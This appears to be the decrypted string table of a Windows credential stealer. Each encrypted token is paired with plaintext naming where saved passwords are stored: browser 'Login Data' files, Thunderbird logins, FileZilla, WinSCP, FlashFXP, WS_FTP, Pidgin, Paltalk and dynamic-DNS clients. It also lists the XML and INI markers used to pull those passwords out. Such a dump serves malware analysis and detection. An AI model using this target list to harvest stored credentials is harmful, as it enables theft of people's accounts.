+xmJSj1Z+SeMpnIdx7RgBGqWxpUxemXeddEexVmmh2ht2/rmW5IUWhiW3ZgwHv+LeICS0ZUhznVN5FuYuLQrWBg== | \Common Files\Apple\Apple Application Support\plutil.exe
+rLhjKhuFtwgn9eW1X+iz5N69qhmo2biFPdqPo5bpsVtasczSoE1ynUse3qeFRSHz | \Apple Computer\Preferences\keychain.plist
+6IxD9VMHlLlkNbeqNg4Fhw== | seamonkey
+q6s4YTGX+KjXVNoeXJzpBw== | SeaMonkey
+p0PDzqn/xONUMUGbTdKlaBl8XgJAq1rWzoU4X7GuEl+sKjK9girJNQi+hVX/H+8Z | Comodo\Dragon\User Data\Default\Login Data
+qlBjkGvEULl8lINzUClG0Q== | Comodo Dragon
+BpFuGpNCzoZoJk3EqhV7wlE1pSsi2MhL6wgyHrBk6YBZyrO0j3vlHkvkFp8aB5ZsEt0HDSksxvIy1eEr3M8dkA== | MapleStudio\ChromePlus\User Data\Default\Login Data
+Blb1NNR0/Hvcsz5eCogilQ== | CoolNovo
+h7fKkTgFIlGpuVxm2tbEgtpyTIa8bMLkRo4PabCBjUT5GHAqY4z/JbMJSbmeZpfb | Chromium\User Data\Default\Login Data
+3rZkqDFZNDnBBXF58Q+wrA== | SRWare Iron
+uBy3Bw3tIZH3NViXwsIrrQyxRGeqjvlrRh6ygrsxTvoH9vQF4v7E4kCZN1AxFb08 | Torch\User Data\Default\Login Data
+B56GQCYZyu+WfamNjwHgLQ== | Torch Browser
+APKufm5xsGmjdmmigwaFhw== | UCBrowser\
+1BytCgZ4vZf09FCjk7IViw== | *
+A7OTfgqb7WQXEcH2rsAkcQ== | Login Data
+zuI1RdMh7nT3NZr4+1cv5g== | journal
+4+K9QWjj+BVHoUrEp1T/cg== | UC Browser
+wulWPYULNTDM8PZxWjITFg== | wow_logins
+kwTbWGPthx54z7ItP6ZZgLDuaSwQAOUPhZKQ/ajEZdBgsym0iO2NFSfrdD0nzJR2ZKuZqj/8seRhbmxhmFyNCQ== | HKEY_CURRENT_USER\Software\Qualcomm\Eudora\CommandLine
+J7VlJCCG7Db/fvIMEGIvpw== | current
+JSM753HtHlM8a1MMjU1Wgg== | Settings
+lY4RWFpX9AJUkIdTAszLqdv6t4Rb9w4Qpf7WNHzxD+M= | SavePasswordText
+bQuHoFE+tYGhqfyEfwggNA== | ReturnAddress
+mptnBr6Tvu+2FIt7PDgXSA== | Eudora
+tmJj5XnYT7IpBWqbz+s17A== | thunderbird
+BlJIsuAfiM2P2pxW4LPVoQ== | signons.sqlite
+6+YOiJjJFuXoc5ghl+hW1w== | moz_logins
+mui3rETbk+Jt+Ci4dJ8Lqw== | hostname
+xVJXWZWqIh5mIrFdAKvC+bHR3aXZm/DLS+z8rpSodSs= | encryptedUsername
+CWU1/X9QUt8ANcHmbViwWvbZX4+jO91nDZHrpMcbYVs= | encryptedPassword
+Pq7mBoKV+ML7QybSk2lHqA== | Thunderbird
+3OumPHec2+0VtVVli6gLcQ== | postbox
+mw+T1Bn8iI94BAbLwlQ6hw== | PostBox
+kq06D1NC9i9UgDtwJM3oTw== | flock
+aaCUxb2tBaokqI+5gOEZqA== | signons3.txt
+VJv/epFRWD3LlccH3BbX4w== | ---
+rJX1oiTBNze70vTvwbsp2Q== | .
+f52RjGKJS5lo54cPE8cSRg== | Flock Browser
+sTlEGKpryWi/HyaRDBRbSg== | ALLUSERSPROFILE
+h9mSVVoPVbfeKda+pn44CA== | \\
+UppqDljkvOirn2L6QnyhyiwJLJSYnCsvA3lFnxPfrHA= | DynDNS\Updater\config.dyndns
+GuFIang5c/Ghr1Jyx1MiGw== | username=
+gc1Gc6FF0ohA75tz34XTMw== | =
+an0dqOjkYHwfgDhD/zhd3w== | password=
+mJsSWcDqDy3MlAysop6B+g== | &H
+AYJjFmZcW4a3W3unjj8u2A== | t6KzXhCh
+rOcrO4oTBNMDFGVtJNh1s6Dcz07vBcXmxvSG2kN+1CA= | http://DynDns.com
+DwYVQjHJlQlgRmBomYvuXQ== | DynDNS
+Hms0sFlSgNOOUdQZtn3pXbkpMOzPPRSihDObeM3KPB4= | \FileZilla\recentservers.xml
+hIpAeeWKB0AHYduhC1Ja0w== | <Server>
+DPidYWtSqCMwGKLiwQEQPw== | 
+eSLzT5bWAI4pepHHS3aL3w== | <Host>
+jcRK2xC2ickW2RbMCKOuiA== | </Host>
+Zul69qgSPOrMMuGqrF6sew== | :
+oBts3CYgATcO/RL+AbBpmQ== | <Port>
+fvEKWhyB2AJ/kqVyJxjn/A== | </Port>
+Gy5Z2MmkKPmp/IyFwu5LEA== | <User>
+vKmf71976sGkcCs1+gTgOA== | </User>
+YGib+OsbRvVmHiEVFVk4TwovECtpsmh0/f+qLQIGfng= | <Pass encoding="base64">
+q+1UXFGkUE2p3etUc40k0Q== | </Pass>
+kh2xf2IXhh44zV3FDSMjwA== | <Pass>
+XKOGjHl1v1fOHa86EhTGVw== | FileZilla
+C/i2TRTbZiqL7HdjOiEj3FYATGE6zxl4N+U554wYWkDKpvXgtyeLw2ByHu2g21xm | SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions
+XOYrq/fsuGitF3gjHZ6ZLA== | HostName
+K2gRXF49t2m+N/iIki14vg== | PublicKeyFile
+TOr6hTilmAf03oSozBCM/g== | PortNumber
+aSparhKfwetOqfMyYtPVWw== | 22
+GTwoavASMA8M6sOgB0tjaA5ZyTN2Afqgsk46EU58aR8= | [PRIVATE KEY LOCATION: "{0}"]
+JbMr3jv7OJBad9CJj1oMTg== | WinSCP
+EekanRbpJE/Z2AZd4BViNQ== | Username
+z7x++Qdj8r2IS5ljZdE/WQ== | All Users
+Ujznm6eDZuoa17LyDAdYLnk1qhU2nMKGITvEe2Klu4s= | \FlashFXP\3quick.dat
+olpcQNSZFZGWAaCsSCtSgg== | IP=
+AmL6nDLW8MJ2xZ/1IGnCPA== | port=
+nw3WgWJ931Ad6MtsKEKx7w== | user=
+fXMiJzEMM5AVPcxU7l9RGA== | pass=
+fwMjkuiWkQrDaxxM2Y9/7A== | created=
+nt6+NgyRL+castjh2R6MzQ== | FlashFXP
+e370YubJ9+XbFfZjMSxbBg== | SystemDrive
+8EPTbx7Ub13fqP7xA1qIH3KlFUgtkgkCT25znyosprs= | \FTP Navigator\Ftplist.txt
+AlxNNqc+qVhVWuM20hoSuw== | Server
+DtybrW5THxF887FZnQSYJw== | No Password
+ytdDmPs80bZfLaw5234ddQ== | FTP Navigator
+5pzZgrH355snScLnNsQFMhwxswIrafhQle4CKgBv7IU= | Programfiles(x86)
+x1kg2TQeUSPs+NbEjXELyg== | programfiles
+C54jRUhshnHyI070IuTpM4W/hBgjatIquA71jHSTUh+jvv0WyzFXXfBcQ/pgSz+F | \jDownloader\config\database.script
+D4tq+m8FZUHRz2WjnzWc969vl55KC9nVW0oezLsQtdc= | programfiles(x86)
+XwRXcpYj9qpypbRPZW9ELV7tLrcvwaw9YurRpU0MsYd6eaUPWh1gahEIvMCoA2sn | INSERT INTO CONFIG VALUES('AccountController','
+RiQ6TTso7EcPKdNnxi3Ehg== | sq
+D7TesGVc8sp0Ymc2v65Wtg== | .
+KJM4FVxsnV+btL0NDweN3g== | t
+uZSSJzDQhislC+TtJy2t3w== | xt
+xhll22cGTxDLc3kmUQrHOw== | JDownloader
+DU8nI9MD5qMha7JoVkg2hNKLT/lguhovPUAHiQyis/4= | Software\Paltalk
+kwTbWGPthx54z7ItP6ZZgEcrL9vpqQTqPJpv8K5ahZReJTRvbtNjFRYVpgMtLudw | HKEY_CURRENT_USER\Software\Paltalk\
+pldWt8Z+E6IgXewVPmzq+g== | pwd
+rFvd81zXKGfKdmAhZNnXN5Y0qSAMST7LFxwGo8TH0kA= | http://Paltalk.com
+U38bix/5MUL5alvO6uHsAA== | Paltalk
+uS+VUL8+TSyneURyRykWQZOnYhn6NWqDhsMtEJ+Pk9o= | \.purple\accounts.xml
+r92/HflmQzxlhm+TXfSLqA== | <account>
+acJQ1UczAVJYph1GDq7qRg== | <protocol>
+a19PEd/XbR9PMVXgcCadLA== | </protocol>
+BBmcSOGCdavq6X3JcD4Jbw== | <name>
+0/lALs+uFU2BqXFm3lri8Q== | </name>
+qt+W5ewmfS0PpsdbzKzlug== | <password>
+GqgeQjQTrjPd/PfUjLaejw== | </password>
+sNqQUJw3e52hZoMf5igbUA== | Pidgin
+RPXruGRT9PgEwv3+vKGP71Ak/3sAUzkvjs4/NaeG7YajrG090hZHK92CNAYLaVlA | \SmartFTP\Client 2.0\Favorites\Quick Connect\
+3JyTJ9FS4WyZ2QjQRZ5Ycz//lQ0Lh354WbLAaHzF+vyrdq/CIu2nboOvTnUGLJVb | SmartFTPClient 2.0FavoritesQuick Connect*.xml
+/xM4C1VOHRzdoan+cwj/MQ== | <Password>
+prD4xqYDT5z3l+Y7LHNokw== | </Password>
+TJIectBY5Yvtn/lm4dOLoA== | <Name>
+W6hjYGqB4m94sG9MxfgL3g== | </Name>
+qFxqq3TB94tTvYcfJxsAZg== | SmartFTP
+h339MAefDMS+zwaIjbwLm5LxGryJnPu4Nsr6DcrqjnukgU5j1LknZwFVbVc2OzbU | \Ipswitch\WS_FTP\Sites\ws_ftp.ini
+UaJTb65SpwVkGWYx01TNlw== | HOST
+0Zkb1XFZdgGz4+mFZIs1Lw== | UID
+uyvfMnAzQvgOw4Zq7ioCoQ== | PWD
+A3g66+rfLPpdgQljPjIQ8g== | WS_FTP
+7T+YIJrRJwcp9twyKLqbHQ== | PWD=
+BvYEfS5WguySRVl36PmRoQ== | Substring
+Ddm6/1Q7wdvglNPXcQOURJAx1nBmhRlrH9lamYWitXY= | Password decryption failed!
+sQmakSi2466ZH+vCDBuFLQ== | Key
+ijH8cuhbPViAWCp8fCHnDA== | Mode
+KRq3LT8gIt27jFOdnIQmrg== | IV
+GTW4TM6QWYJjlOovmnXT9w== | Padding
+SwcHqu5QjzdChH8blk8/+g== | CreateDecryptor
+K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4fpmLi/O+20Ac6XwZSCbadNGJ2Z/TSLTLvt6taW2Xds5LkAHUvsO+byH2iIgfog7YNjZs2QCymmu+rIadLa8pMgXOgXElb2KVtzjsNq+0pHvw== | HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\FTP Commander\UninstallString
+4ivkbeJ9sgbeTFUwb9ovvg== | uninstall.exe
+Xaf1tcvVkaMcgkfaJ6nWRA== | Ftplist.txt
+eFV1VfEd6xJ9MfE6jM2sDg== | ;Server=
+8chSvIB3tqT42N+5XTUZWg== | ;Port=
+Rw5qrGHNHx3utH8xzcn/zw== | ;Password=
+V0k5FDQVlrDvC7LnXaO6aw== | ;User=
+5TM0rorFAHFFy6PpLK6wsA== | ;Anonymous=
+CR49pgy7RFAUPFPfLCkMmw== | Name=
+mUMDGnHXjjSFbZXgUKY/pA== | FTPCommander
+K0ocYJdpSlFAvhxHrgztFahe78Xf+Ce7A2HQAcS75WPIs72M8f14WC3YQPpfbd7M | HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC
+kwTbWGPthx54z7ItP6ZZgDcDY6ebmwqnETMDtOwvYVLh2RoLSrlKXKFV9i26r3TA | HKEY_CURRENT_USER\SOFTWARE\Vitalwerks\DUC
+u5AYAU3ZI32x4F6gTmCQAA== | USERname
+CGdc9wAphv+yegXM6dfD29Q9evE+UWL03OZstvZK0ps= | http://no-ip.com
+1KSKWvcccUG5bNxv9DLMmg== | NO-IP
+q3BuWKbz9UVM0vwJiV+jQRXejtQPS1CT8/kIbqn6QiOCVTv2hNAcIQMW+Eyii3zr | Input text must be a multiple of 4 characters!
+a0lze3YgEKKbU2djGfsLpN7Tpux49xAQvUyxNlVOF0jH7F2h1BtPnhXsgTkeyku9r7c5DmFGRlFd4ubI4DpzkjKi5HXopF9IIqcd4uHd4z0= | +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+bCYODUbmaK6pHNkzHVJVYkuPCbsbMNeZbQ+RMWL1lBpPhjBKR4pU+WQFxchEoIVN | Input contains illegal character '
+Tzqlcrb3kry8ZHgj4xztKQ== | '!
+8/vcjxIlsxdXe0mZcB9HuA== | \The Bat!
+EjxaTG1zjv6+QPiF4geNkQ== | \Account.CFN
+L7w2JUo4qh4f5rdbDpDyiA== | 
